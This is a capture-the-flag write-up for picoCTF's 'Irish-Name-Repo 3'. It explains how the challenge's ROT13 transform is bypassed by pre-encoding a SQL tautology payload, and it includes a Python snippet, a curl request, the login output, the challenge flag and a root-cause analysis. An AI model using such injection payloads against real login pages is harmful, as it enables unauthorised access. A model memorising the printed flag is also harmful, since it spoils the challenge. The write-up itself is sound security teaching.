# Irish-Name-Repo 3

**Platform:** CyLab Security Academy (picoCTF)
**Category:** Web Exploitation
**Difficulty:** Medium
**Flag:** `picoCTF{3v3n_m0r3_SQL_2af58a67}`

## Summary

The third entry in the series drops the username field entirely (the query always targets a
single `admin` row) and appears to "fix" the SQL injection by transforming submitted SQL
keywords like `OR`, `UNION`, and `SELECT` into garbage before they reach the query. In reality,
the app just unconditionally ROT13-encodes the *entire* `password` field before concatenating it
into the SQL string — every letter shifts, digits/punctuation/quotes don't. Since ROT13 is its
own inverse, pre-encoding the payload's letters with ROT13 before sending makes the server's
transform decode it right back into the real injection.

## Discovery

A debug mode (`debug=1`) echoes both the raw submitted value and the assembled SQL query. The
classic tautology bypass looked blocked at first glance:

```
password=' OR '1'='1' -- 
```

```
SQL query: SELECT * FROM admin where password = '' BE '1'='1' -- '
```

`OR` became `BE` — which looks like a keyword-specific filter, but testing plain, non-SQL words
showed the *entire* value gets transformed regardless of content:

```
password=hello   → SQL query: ...password = 'uryyb'
password=zzzzz   → SQL query: ...password = 'mmmmm'
password=admin   → SQL query: ...password = 'nqzva'
password=abc123  → SQL query: ...password = 'nop123'   (digits untouched)
```

Each is exactly the ROT13 of the input (letters rotated 13 places, everything else identical) —
confirming a blanket ROT13 encode, not a keyword denylist.

## Proof of Concept

ROT13-encode the *letters* of the desired injection before sending, so the server's own
transform reverses it back to the intended SQL:

```python
import codecs
desired = "' OR '1'='1' -- "
send = codecs.encode(desired, 'rot13')   # "' BE '1'='1' -- "
```

```
curl -s -X POST "http://TARGET/login.php" --data-urlencode "password=' BE '1'='1' -- "
```

```
SQL query: SELECT * FROM admin where password = '' OR '1'='1' -- '
Logged in! Your flag is: picoCTF{3v3n_m0r3_SQL_2af58a67}
```

## Root Cause

Applying a reversible, keyless transform (ROT13) to user input and treating that as a security
control accomplishes nothing — the attacker just runs the same reversible transform on their
payload before submitting it. The actual vulnerability (string-concatenated SQL) is completely
unaddressed.

## CWE / OWASP

- **CWE-89**: SQL Injection
- **CWE-656**: Reliance on Security Through Obscurity
- **OWASP A03:2021**: Injection
